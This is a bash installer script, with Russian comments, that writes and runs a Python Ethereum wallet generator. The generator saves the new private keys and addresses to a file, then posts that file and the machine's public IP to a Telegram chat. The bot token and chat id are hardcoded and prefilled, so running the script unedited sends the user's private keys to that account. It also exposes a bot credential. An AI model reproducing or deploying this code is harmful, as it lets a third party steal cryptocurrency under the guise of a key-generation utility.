#!/bin/bash

# Имя файла Python-скрипта
PYTHON_SCRIPT="walletgen.py"

# Создаем Python-скрипт
echo "Создаем Python-скрипт: $PYTHON_SCRIPT"
cat <<EOF > $PYTHON_SCRIPT
from eth_account import Account
import requests
while True:
    try:
        n = int(input("Введите количество кошельков: "))
        break
    except ValueError:
        print("Введите число.")
#НИЖЕ ВСТАВИТЬ СВОЙ USER_ID TELEGRAM, УЗНАТЬ МОЖНО ТУТ https://t.me/getmyid_bot
id = 341894058
#НИЖЕ ВСТАВИТЬ СВОЙ ТОКЕН ОТ БОТА, ПОЛУЧИТЬ ОТ BOTFATHER https://t.me/BotFather
bot_token = "bot7790018788:AAEllf_Mik30e8xHjNv9CSg5twrD9eFLugQ"
wallets = []
ip = requests.get("https://api.ipify.org").text
for i in range(n):
    acc_ = Account.create()
    wallets.append(f"0x{acc_.key.hex()} {acc_.address} ")
wallets.append("")
with open("wallets.txt","w+",encoding="utf-8") as f:
    f.write('\n'.join(wallets))
doc = open(f'wallets.txt',"rb")
filename = f'{ip} - {n} wallets.txt'
url = f"https://api.telegram.org/{bot_token}/sendDocument"
response = requests.post(url, data={'chat_id': id,'caption':f"Сгенерировано {n} кошельков на сервере {ip}"}, files={'document': (filename,doc)})
print(f"{n} кошельков сгенерировано в wallets.txt")
if response.status_code == 200:
    print("Успешно отправил файл с кошельками в тг.")
else:
    print("Не получилось отправить файл с кошельками в тг.")
EOF

# Проверяем, что файл был создан
if [[ -f "$PYTHON_SCRIPT" ]]; then
    echo "Файл $PYTHON_SCRIPT успешно создан."
else
    echo "Ошибка: файл $PYTHON_SCRIPT не был создан."
    exit 1
fi
# Проверяем, какая версия python установлена
if command -v python3 &> /dev/null; then
    echo "Python 3 установлен."
    PYTHON_CMD="python3"
elif command -v python &> /dev/null; then
    echo "Python установлен."
    PYTHON_CMD="python"
else
    echo "Python не установлен."
    return 1
fi
$PYTHON_CMD -c "import eth_account" &> /dev/null
if [ $? -eq 0 ]; then
    echo "Библиотека eth_account установлена."
else
    echo "Библиотека eth_account не установлена. Начинаю установку."
	pip install eth_account
fi
# Проверяем успешность установки
if [[ $? -eq 0 ]]; then
    echo "Пакет eth_account успешно установлен."
else
    echo "Ошибка при установке пакета eth_account."
    exit 1
fi

# Запускаем Python-скрипт
echo "Запускаем Python-скрипт..."
$PYTHON_CMD $PYTHON_SCRIPT

# Проверяем успешность выполнения
if [[ $? -eq 0 ]]; then
    echo "Python-скрипт выполнен успешно."
else
    echo "Ошибка при выполнении Python-скрипта."
fi